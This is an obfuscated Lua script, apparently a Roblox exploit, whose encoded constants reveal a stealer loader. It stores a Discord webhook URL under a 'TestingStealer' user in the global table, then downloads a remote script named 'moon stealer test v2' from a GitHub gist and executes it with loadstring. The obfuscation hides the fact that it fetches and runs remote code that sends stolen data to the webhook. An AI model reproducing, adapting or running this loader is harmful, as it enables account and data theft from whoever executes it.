--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.6) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v72=v2(v0(v30,16));if v19 then local v92=v5(v72,v19);v19=nil;return v92;else return v72;end end end);local function v20(v31,v32,v33)if v33 then local v73=0 + 0 + 0 ;local v74;while true do if (v73==(1517 -(9 + 1508))) then v74=(v31/((3 -1)^(v32-((622 -(602 + 19)) + 0))))%((1 + 1 + 0)^(((v33-1) -(v32-(1 + 0))) + 1 + 0)) ;return v74-(v74%(2 -1)) ;end end else local v75=0;local v76;while true do if (v75==(117 -(15 + 102))) then v76=2^(v32-(1 + 0)) ;return (((v31%(v76 + v76))>=v76) and (1 + 0)) or (1028 -(831 + 197)) ;end end end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=1665 -(1064 + (1529 -928)) ;local v36;local v37;while true do if (v35==((3522 -2336) -(682 + 313 + 191))) then v36,v37=v1(v16,v18,v18 + (1224 -(42 + 1180)) );v18=v18 + 2 + 0 ;v35=1;end if (v35==1) then return (v37 * (1480 -(1197 + 27))) + v36 ;end end end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + (574 -(73 + 498)) );v18=v18 + (1615 -(478 + 1133)) ;return (v41 * ((18125309 + 2170168) -3518261)) + (v40 * ((148399 + 20953) -103816)) + (v39 * (2057 -(777 + 1024))) + v38 ;end local function v24()local v42=v23();local v43=v23();local v44=1 + 0 + 0 ;local v45=(v20(v43,2 -1 ,(425 + 792) -(1020 + 177) ) * (((1817 -1215) -(360 + 240))^32)) + v42 ;local v46=v20(v43,21,25 + 6 );local v47=((v20(v43,32)==(1 -0)) and  -1) or (11 -(8 + 2)) ;if (v46==(0 -0)) then if (v45==(0 -(0 -0))) then return v47 * (0 + 0) ;else v46=1298 -(45 + 27 + 1225) ;v44=(0 -0) -0 ;end elseif (v46==2047) then return ((v45==0) and (v47 * ((1 + 0)/(879 -(837 + 42))))) or (v47 * NaN) ;end return v8(v47,v46-(910 + 113) ) * (v44 + (v45/(((5 + 0) -3)^(112 -60)))) ;end local function v25(v48)local v49=0 -(0 + 0) ;local v50;local v51;while true do if (v49==(0 + 0)) then v50=nil;if  not v48 then v48=v23();if (v48==(0 + 0)) then return "";end end v49=(5485 -3994) -(1151 + 339) ;end if (v49==(9 -7)) then v51={};for v93=603 -(225 + 377) , #v50 do v51[v93]=v2(v1(v3(v50,v93,v93)));end v49=(179 -(73 + 104)) + (1 -0) ;end if (v49==(1695 -(1197 + 495))) then return v6(v51);end if (v49==(828 -(223 + 604))) then v50=v3(v16,v18,(v18 + v48) -(192 -(74 + 117)) );v18=v18 + v48 ;v49=232 -(139 + 91) ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=588 -(470 + 118) ;local v53;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (v52==(1 + 0)) then v55=nil;v56=nil;v52=1 + 1 ;end if (v52~=(770 -(659 + 111))) then else v53=1059 -(158 + 901) ;v54=nil;v52=1217 -(842 + 374) ;end if (v52==(2 + 0)) then v57=nil;v58=nil;v52=6 -3 ;end if (v52==3) then v59=nil;v60=nil;v52=9 -5 ;end if (v52==(433 -(426 + 3))) then while true do if (v53==3) then v60=nil;while true do local v100=0 -0 ;local v101;while true do if (0==v100) then v101=0;while true do if (v101==0) then local v104=0 + 0 ;while true do if (v104~=(1759 -(826 + 932))) then else v101=1 + 0 ;break;end if (v104~=(900 -(802 + 98))) then else local v116=0;while true do if (v116==(3 -2)) then v104=1 -0 ;break;end if (v116~=(1175 -(403 + 772))) then else if (2~=v54) then else local v140=0 + 0 ;local v141;while true do if (v140~=0) then else v141=0;while true do local v157=0;while true do if (0==v157) then if (v141~=(0 -0)) then else local v161=0 + 0 ;local v162;while true do if (v161~=(680 -(70 + 610))) then else v162=0 + 0 ;while true do if (v162==(1414 -(721 + 693))) then for v177=1,v23() do local v178=0;local v179;while true do if (v178~=(0 -0)) then else v179=v21();if (v20(v179,4 -3 ,1 + 0 )==0) then local v183=0 -0 ;local v184;local v185;local v186;local v187;while true do if (v183==(0 -0)) then v184=0 -0 ;v185=nil;v183=1;end if ((1 + 1)==v183) then while true do if (v184~=1) then else local v188=0 + 0 ;while true do if (v188==0) then v187={v22(),v22(),nil,nil};if (v185==(172 -(15 + 157))) then local v194=0;local v195;while true do if (v194~=(0 + 0)) then else v195=0;while true do if (v195==(0 -0)) then v187[9 -6 ]=v22();v187[4]=v22();break;end end break;end end elseif (v185==(1 + 0)) then v187[3]=v23();elseif (v185==2) then v187[1429 -(1051 + 375) ]=v23() -((4 -2)^(623 -(466 + 141))) ;elseif (v185==3) then local v204=360 -(337 + 23) ;local v205;while true do if (v204==0) then v205=0 + 0 ;while true do if (v205~=(0 + 0)) then else v187[9 -6 ]=v23() -((425 -(139 + 284))^(16 + 0)) ;v187[4]=v22();break;end end break;end end end v188=1;end if (v188==(1963 -(477 + 1485))) then v184=3 -1 ;break;end end end if (v184==(8 -5)) then if (v20(v186,3 -0 ,3 + 0 )==(1 + 0)) then v187[156 -(111 + 41) ]=v60[v187[4]];end v55[v177]=v187;break;end if (2==v184) then local v190=0;while true do if (v190==1) then v184=245 -(197 + 45) ;break;end if ((0 + 0)~=v190) then else if (v20(v186,1,1)==(1 + 0)) then v187[2]=v60[v187[2 + 0 ]];end if (v20(v186,4 -2 ,1 + 1 )==1) then v187[2 + 1 ]=v60[v187[1 + 2 ]];end v190=670 -(456 + 213) ;end end end if (v184~=0) then else local v191=0 -0 ;while true do if (v191==(223 -(153 + 69))) then v184=1;break;end if (v191==(1748 -(529 + 1219))) then v185=v20(v179,6 -4 ,725 -(374 + 348) );v186=v20(v179,4 + 0 ,17 -11 );v191=1494 -(873 + 620) ;end end end end break;end if (v183==(1 -0)) then v186=nil;v187=nil;v183=1 + 1 ;end end end break;end end end for v180=2 -1 ,v23() do v56[v180-(420 -(349 + 70)) ]=v28();end v162=3 -2 ;end if ((1 + 0)==v162) then v141=1 + 0 ;break;end end break;end end end if (v141~=(1 + 0)) then else for v168=1 -0 ,v23() do v57[v168]=v23();end return v58;end break;end end end break;end end end if (v54==(1 + 0)) then local v142=0 + 0 ;local v143;local v144;while true do if (v142==(1 + 0)) then while true do if (v143==(0 + 0)) then v144=0 -0 ;while true do if (v144==0) then local v163=0 + 0 ;local v164;while true do if (v163~=0) then else v164=1425 -(585 + 840) ;while true do if (v164~=0) then else local v176=0 + 0 ;while true do if (v176==(358 -(30 + 327))) then v164=1687 -(163 + 1523) ;break;end if (v176==0) then v59=v23();v60={};v176=300 -(71 + 228) ;end end end if (v164~=1) then else v144=1;break;end end break;end end end if (v144==2) then v54=7 -5 ;break;end if (v144~=(1549 -(737 + 811))) then else local v165=0;while true do if (v165~=(854 -(767 + 87))) then else for v171=1,v59 do local v172=281 -(24 + 257) ;local v173;local v174;local v175;while true do if (v172==(868 -(541 + 326))) then v175=nil;while true do if (v173==(0 + 0)) then v174=v21();v175=nil;v173=1 + 0 ;end if (v173~=(1 -0)) then else if (v174==(2 -1)) then v175=v21()~=0 ;elseif (v174==(613 -(544 + 67))) then v175=v24();elseif (v174==(10 -7)) then v175=v25();end v60[v171]=v175;break;end end break;end if (v172==0) then v173=0;v174=nil;v172=1938 -(1032 + 905) ;end end end v58[1416 -(121 + 1292) ]=v21();v165=24 -(20 + 3) ;end if (v165==(314 -(173 + 140))) then v144=1 + 1 ;break;end end end end break;end end break;end if (v142~=(1678 -(5 + 1673))) then else v143=13 -(12 + 1) ;v144=nil;v142=1;end end end v116=1 + 0 ;end end end end end if (v101==1) then if (v54~=(0 + 0)) then else local v105=0 -0 ;local v106;local v107;while true do if (v105==(385 -(72 + 312))) then while true do if (v106==(1721 -(1133 + 588))) then v107=0 -0 ;while true do if (v107~=(354 -(203 + 150))) then else local v150=0 -0 ;while true do if (1==v150) then v107=2;break;end if (v150~=0) then else v57={};v58={v55,v56,nil,v57};v150=2 -1 ;end end end if ((780 -(565 + 215))~=v107) then else local v151=0;while true do if (v151==(0 + 0)) then v55={};v56={};v151=1221 -(928 + 292) ;end if (v151==(2 -1)) then v107=2 -1 ;break;end end end if (v107~=2) then else v54=1 + 0 ;break;end end break;end end break;end if (v105==0) then v106=0;v107=nil;v105=1787 -(144 + 1642) ;end end end break;end end break;end end end break;end if (v53==(5 -3)) then local v99=1403 -(20 + 1383) ;while true do if (v99==1) then v53=3 + 0 ;break;end if ((1930 -(1593 + 337))==v99) then v58=nil;v59=nil;v99=1;end end end if (v53~=1) then else v56=nil;v57=nil;v53=1904 -(714 + 1188) ;end if (v53~=(0 + 0)) then else v54=0 -0 ;v55=nil;v53=1;end end break;end end end local function v29(v61,v62,v63)local v64=v61[1];local v65=v61[2];local v66=v61[3];return function(...)local v67=1;local v68= -1;local v69={...};local v70=v12("#",...) -1 ;local function v71()local v77=v64;local v78=v65;local v79=v66;local v80=v27;local v81={};local v82={};local v83={};for v87=1917 -(392 + 1525) ,v70 do if ((v87>=v79) or (((179 -106) + 2026)==((2789 + 2533) -1571))) then v81[v87-v79 ]=v69[v87 + (130 -(123 + 6)) ];else v83[v87]=v69[v87 + 1 + 0 ];end end local v84=(v70-v79) + (1744 -((2716 -1867) + 894)) ;local v85;local v86;while true do local v88=1434 -(1126 + 308) ;local v89;while true do if (((10894 -7500)>=(3371 -(546 + 1142))) and (v88==(0 + 0 + 0))) then v89=0 + 0 ;while true do if ((v89==(0 -(0 -0))) or ((1261 + 1678)==(5646 -(482 + 640)))) then local v102=0 + 0 + 0 ;while true do if (((889 -(50 + (593 -(66 + 37))))<(3131 -(715 + 927))) and (v102==(1 + 0))) then v89=1533 -(304 + 1228) ;break;end if ((((812 + 4110) -(177 + 1165))<=(4558 -(33 + 52))) and (v102==0)) then local v103=0 -0 ;while true do if (((15307 -11024)>(675 + 2450)) and (v103==(1443 -(564 + 879)))) then v85=v77[v67];v86=v85[1 + 0 + 0 ];v103=(2675 -1777) -(465 + 265 + 167) ;end if ((v103==((4 -3) + 0)) or ((3607 -(368 + (148 -(4 + 11))))>=(10283 -6964))) then v102=3 -2 ;break;end end end end end if ((v89==((1538 -(675 + 862)) + 0)) or ((861 + 1129)>=(2290 + 213))) then if (((2783 -1106)>=(410 + 916)) and (v86<=(1794 -(348 + 1441)))) then if (((6766 -(14924 -11681))<=(8002 -(418 + 2631))) and (v86<=(1 + 1))) then if (((3375 -(222 + 1364))>1603) and (v86<=0)) then v83[v85[2 -0 ]]=v85[11 -8 ]~=(0 -0) ;elseif ((v86>1) or ((16744 -12532)<(2995 -(864 + 474)))) then if ((v85[4 -2 ]==v83[v85[1897 -(1484 + (1326 -917)) ]]) or ((5310 -(102 + 1186 + 25))==(11425 -8243))) then v67=v67 + 1 + 0 ;else v67=v85[2 + 1 ];end else v83[v85[8 -6 ]]=v85[2 + 1 ];end elseif (((5334 -(1335 + 294))<((5636 -(336 + 105)) -(472 + 693))) and (v86<=(1 + 2))) then v67=v85[1 + 2 ];elseif (((677 + 1481)<=(4890 -((996 -790) + 303))) and (v86>(5 -1))) then do return;end else v83[v85[1434 -(1289 + 143) ]]();end elseif (((752 + 1767)>(803 -(175 + 184))) and (v86<=((345 + 646) -(288 + 695)))) then if ((v86<=(4 + 2)) or ((8597 -(151 + 5224))<=(883 + 738))) then local v112=0 + 0 ;local v113;local v114;local v115;while true do if (((513 + 1056)>673) and (v112==(1 + 0))) then v115=nil;while true do if ((v113==(1 -0)) or ((9522 -5256)<=((976 -609) + 711))) then while true do if (((4069 + 246)==(1752 + (3530 -967))) and (v114==(0 -(0 -0)))) then v115=v85[1857 -(286 + 1569) ];v83[v115]=v83[v115](v13(v83,v115 + ((11 + 226) -(46 + 190)) ,v68));break;end end break;end if ((v113==0) or ((1110 + 1438)==(923 -619))) then local v145=1901 -((1014 -(503 + 235)) + 1625) ;while true do if (((2311 + 902)>=(1218 -(135 + 2))) and (v145==(127 -(38 + 88)))) then v113=574 -(93 + 480) ;break;end if (((621 -(388 + 233))==v145) or (((1252 + 6967) -4602)==(34 + 140 + 2881))) then v114=855 -(294 + 561) ;v115=nil;v145=1 -0 ;end end end end break;end if ((v112==(0 -0)) or (((423 + 1362) -((1240 -916) + 479))<=(117 + 532))) then v113=0 -0 ;v114=nil;v112=1 + 0 ;end end elseif ((v86>(1826 -(422 + 1397))) or ((43 + 2413)==(914 -329))) then local v119=0 -0 ;local v120;local v121;local v122;local v123;local v124;while true do if ((v119==(47 -(35 + 12))) or ((879 + 766)<=(3888 -2519))) then v120=1723 -(531 + 1192) ;v121=nil;v119=1001 -(834 + 166) ;end if (((6447 -1669)>(638 + 222)) and (v119==(1 -(556 -(494 + 62))))) then v122=nil;v123=nil;v119=(876 -(540 + 335)) + 1 ;end if (((4630 -(821 + 728))==(8490 -5409)) and (v119==(8 -6))) then v124=nil;while true do if ((v120==(638 -(70 + 369 + 198))) or ((4037 -(372 + 629))==(12949 -8869))) then local v146=536 -((290 -175) + 421) ;while true do if ((((1 -0) + 0)==v146) or ((1463 -(400 + 875))>=(4227 -(312 + 174)))) then v120=1 + 1 ;break;end if ((v146==(0 + 0)) or ((2205 -(246 + 143))==(2843 -(5 + 623)))) then local v158=610 -(55 + 555) ;while true do if ((((1050 -(242 + 496)) + 218)==(1452 -(617 + 305))) and (v158==(28 -(1 + 6 + (1430 -(287 + 1122)))))) then v68=(v123 + v121) -(2 -1) ;v124=0 + (0 -0) ;v158=1 + 0 ;end if (((5206 -2411)<=(5256 -(47 + 1096))) and (v158==(1 + 0))) then v146=3 -2 ;break;end end end end end if (((1689 + 206)==(2672 -777)) and ((1526 -((2809 -(1033 + 844)) + 592))==v120)) then for v154=v121,v68 do local v155=0 -0 ;local v156;while true do if ((v155==(0 -0)) or (((18643 -10365) -4478)<(2290 -(614 + 1158)))) then v156=1090 -(669 + 421) ;while true do if (((5791 -3211)<(17687 -13201)) and (v156==(1657 -(866 + 136 + 655)))) then v124=v124 + (2 -1) ;v83[v154]=v122[v124];break;end end break;end end end break;end if ((((12195 -(39 + 2)) -(8504 -(112 + 451)))>(4641 -2908)) and (v120==(0 + 0))) then local v147=0 -0 ;while true do if (((8424 -5193)<(8633 -4428)) and (v147==(3 -2))) then v120=1 -0 ;break;end if (((264 + (4231 -3145))<(7033 -4488)) and (v147==0)) then local v159=1391 -(163 + 1228) ;while true do if (((594 + 862 + 3006)>=(1495 -1162)) and (v159==(1 + 0))) then v147=1207 -(807 + 399) ;break;end if (((4663 -(227 + 520))>=(234 + 695)) and (v159==(0 + 0))) then v121=v85[2 + 0 ];v122,v123=v80(v83[v121](v13(v83,v121 + (2 -1) ,v85[2 + 1 ])));v159=1 + (0 -0) ;end end end end end end break;end end else v83[v85[2 + 0 ]]=v63[v85[3 + 0 ]];end elseif ((v86<=(10 + 0)) or ((2964 -(62 + 142))<(5033 -3236))) then if ((v86>(1766 -(1155 + 602))) or ((6247 -(1326 + 797))==(8676 -5653))) then if (((5716 -(320 + 1416))<(4604 -(41 + 2))) and (v83[v85[2 + 0 ]]==v85[4])) then v67=v67 + (4 -(5 -2)) ;else v67=v85[6 -3 ];end else v83[v85[(991 + 921) -(1697 + 213) ]][v85[(6 -3) + 0 ]]=v85[1 + 3 ];end elseif (((3856 -(143 + 173))>=(953 + 2116)) and (v86>((135 -100) -24))) then for v132=v85[2 + 0 ],v85[2 + 1 ] do v83[v132]=nil;end else local v129=0 -0 ;local v130;local v131;while true do if (((439 + 1092)<(4863 -(648 + 120))) and (v129==(0 + 0))) then local v136=0 -0 ;while true do if ((((1568 -1247) + 3316)==(4042 -(221 + 184))) and (v136==(2 -1))) then v129=1 -0 ;break;end if ((v136==(0 + 0)) or (((1590 -807) + 3580)<(518 -202))) then v130=v85[1604 -(392 + 1210) ];v131=v83[v85[760 -(322 + 435) ]];v136=1 -0 ;end end end if ((v129==(1357 -(348 + 1008))) or (((12572 -(139 + 249)) -8278)<=(1894 -(82 + 178)))) then v83[v130 + (1828 -((1968 -(548 + 364)) + 771)) ]=v131;v83[v130]=v131[v85[1 + 3 ]];break;end end end v67=v67 + (2 -1) ;break;end end break;end end end end A,B=v27(v11(v71));if  not A[1] then local v90=0;local v91;while true do if (0==v90) then v91=v61[4][v67] or "?" ;error("Script error at ["   .. v91   .. "]:"   .. A[2] );break;end end else return v13(A,2,B);end end;end return v29(v28(),{},v17)(...);end v15("LOL!0B3O00028O00026O00F03F03023O005F4703043O0055736572030F3O0054657374696E67537465616C652O7203073O00776562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313039322O30333534392O3234393135302O352F614E6663794571736D657A363833624D702O375F4677626D5762384B54554D3479615051547A7947756433566A74685A6E33794268622O354B57786D4D363541764C7270030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574039C3O00682O7470733A2O2F676973742E67697468756275736572636F6E74656E742E636F6D2F4D2O6F6E4465765265642F3731633334373031662O623638336531646664376538363930633637343166632F7261772F39303233613837653639353133642O363337356433383731623532623266306263623637393531662F6D2O6F6E2532353230737465616C65722532353230746573742532353230763200233O0012013O00014O000C000100013O00260A3O0002000100010004033O00020001001201000100013O00260A00010014000100010004033O00140001001201000200013O000E020002000C000100020004033O000C0001001201000100023O0004033O0014000100260A00020008000100010004033O00080001001207000300033O003009000300040005001207000300033O003009000300060007001201000200023O0004033O0008000100260A00010005000100020004033O00050001001207000200083O001207000300093O00200B00030003000A0012010005000B6O000600014O0008000300064O000600023O00022O00040002000100010004033O002200010004033O000500010004033O002200010004033O000200012O00053O00017O00233O00023O00033O00053O00053O00063O00083O00083O00093O000B3O000B3O000C3O000D3O000F3O000F3O00103O00103O00113O00113O00123O00133O00163O00163O00173O00173O00173O00173O00173O00173O00173O00173O00183O00193O001B3O001C3O001E3O00",v9(),...);end
